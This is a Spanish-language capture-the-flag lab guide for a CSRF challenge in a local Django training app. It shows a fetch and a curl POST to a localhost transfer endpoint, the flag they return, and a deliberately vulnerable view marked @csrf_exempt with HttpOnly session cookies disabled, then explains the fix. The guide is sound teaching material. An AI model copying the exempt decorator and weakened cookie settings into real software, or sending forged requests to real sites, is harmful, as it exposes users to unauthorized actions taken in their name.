[← Índice de resolución](guia-resolucion-ctf.md) · [Reto 2](guia-reto2-union-hash.md) · [Laboratorio](../lab/README.md)

# Reto 3 — Transferencia sin protección CSRF (Medio)

**URL:** `/reto3/` (página) → `POST /transferir/` (endpoint) ·
**Objetivo:** ejecutar una transferencia sin token CSRF ni sesión
verificada.

Este es el **ejercicio de reserva** de
[ejercicios-practicos.md](ejercicios-practicos.md) — úsalo si el tiempo
de la charla alcanza, o resuélvelo aparte para tenerlo practicado. No
requiere haber resuelto los Retos 1 y 2 antes: es independiente.

---

### El escenario

Abre **http://127.0.0.1:8000/reto3/** (con el servidor en
`LAB_MODE=vulnerable`). Vas a ver un formulario simulado de
"Transferir fondos" con un botón — **no está enlazado desde ningún otro
lugar del sitio**, pero el endpoint que llama
(`POST /transferir/`) sigue respondiendo a cualquier petición que le
llegue, sin verificar de dónde vino ni pedir un token CSRF.

### Paso 1 — Ejecutar la transferencia con el botón

Click en "Ejecutar transferencia". El botón dispara este código
(visible en pista 3 de la página):

```javascript
fetch("/transferir/", {
  method: "POST",
  headers: {"Content-Type": "application/x-www-form-urlencoded"},
  body: "monto=999999&destino=cuenta-del-atacante"
}).then(r => r.json()).then(console.log)
```

**Qué deberías ver:** un banner verde "🚩 ¡Funcionó sin token CSRF!" con
un mensaje de transferencia simulada y la flag
(`AIEP{csrf_sin_proteccion_2026}` por defecto, configurable vía
`LAB_FLAG_3`).

### Paso 2 (opcional) — Reproducirlo desde la consola del navegador

Abre las herramientas de desarrollador (F12 → pestaña Console) en
**cualquier página**, incluso una que no tenga nada que ver con este
sitio, y pega el mismo `fetch`. Si tu sesión del laboratorio sigue activa
en el navegador, funciona igual — esa es justamente la demostración: la
petición no depende de que la hayas iniciado tú desde la página correcta.

### Paso 3 (opcional) — Verificarlo con curl, sin sesión ni navegador

El endpoint ni siquiera necesita cookies de sesión para responder (código
real, verificado contra el despliegue):

```powershell
curl -X POST "http://127.0.0.1:8000/transferir/" `
  --data-urlencode "monto=9999" `
  --data-urlencode "destino=cuenta-atacante"
```

Respuesta esperada:
```json
{"ok": true, "mensaje": "Transferencia simulada de 9999 a 'cuenta-atacante' — sin validar CSRF ni origen.", "flag": "AIEP{csrf_sin_proteccion_2026}"}
```

**Por qué funciona — la explicación técnica**
(código real en [lab/accounts/views.py](../lab/accounts/views.py)):

```python
@csrf_exempt
def transferir_fondos(request):
    if settings.LAB_MODE != "vulnerable" or request.method != "POST":
        return JsonResponse({"error": "forbidden"}, status=403)

    monto = request.POST.get("monto", "0")
    destino = request.POST.get("destino", "")
    return JsonResponse({
        "ok": True,
        "mensaje": f"Transferencia simulada de {monto} a '{destino}' — sin validar CSRF ni origen.",
        "flag": flags.FLAG_3,
    })
```

El decorador `@csrf_exempt` le dice a Django que **no** exija el token
CSRF habitual en este endpoint. Sumado a que, en `LAB_MODE=vulnerable`,
las cookies de sesión se sirven sin `HttpOnly`/`Secure`
(`SESSION_COOKIE_HTTPONLY = False`, ver
[lab/intranet/settings.py](../lab/intranet/settings.py)), esto reproduce el
escenario clásico de CSRF: si la víctima tiene una sesión abierta en un
sitio así, **cualquier otra pestaña o sitio malicioso** puede disparar
esta misma petición en su nombre, sin que la víctima haga nada más que
tener el sitio abierto.

### En modo corregido

```powershell
$env:LAB_MODE = "secure"
```

Con el servidor reiniciado en modo `secure`, el mismo endpoint responde
`403 Forbidden` (`{"error": "forbidden"}`) — la vista revisa
`settings.LAB_MODE` explícitamente para este ejercicio. En una
corrección real, el primer paso sería simplemente **quitar el decorador
`@csrf_exempt`**, dejando que la protección CSRF nativa de Django (que
ya viene activa por defecto en todo el proyecto) haga su trabajo.

---

Siguiente: [Reto 4 — Buscador vulnerable](guia-reto4-buscador-union.md)
